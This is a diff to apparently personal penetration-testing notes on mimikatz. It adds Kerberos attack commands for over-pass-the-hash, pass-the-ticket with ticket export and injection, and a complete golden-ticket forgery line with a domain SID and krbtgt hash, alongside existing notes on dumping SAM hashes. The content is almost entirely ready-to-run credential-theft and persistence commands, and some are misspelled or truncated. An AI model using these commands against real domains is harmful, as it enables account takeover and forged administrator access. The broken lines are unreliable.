@@ -40,3 +40,20 @@ Requires specific privileges.
 3. if not done before: `log my_log.txt` -> enable logging (highly recommended)
 3. `lsadump::sam` -> will dump content SAM
     - Check the output for NTLM hash
+
+
+## Kerbersos 
+**Over-pass-the-hash**
+1. `.\mimikatz.exe`  -> start mimikatz prompt
+2. `privilege::debug` -> aquire debug privilege to spy into other processes (which we have to be admin)
+3. `seurlsa::pth /user:Administrator /domain:chocolate.locl /ntlm.cc36.....`
+
+**Pass-the-ticket**
+Something like: 
+- "sekurlsa::tickets [/export]"  -> see pdf
+- kerberos::ptt path/to/ticket.kirbi -> see pdf
+
+**Golden/Silver ticket** 
+Golden ticket: `mimikatz kerberos::golden /user:dfm /domain:testlab.local /sid:S-1-5-21-883232822-274137685-4173207997 /krbtgt:b3c87251042db43980ef7607733fda72 /ptt`  (via Cobal strike, see pdf)
+
+Silver ticket is similar just for a specific service.
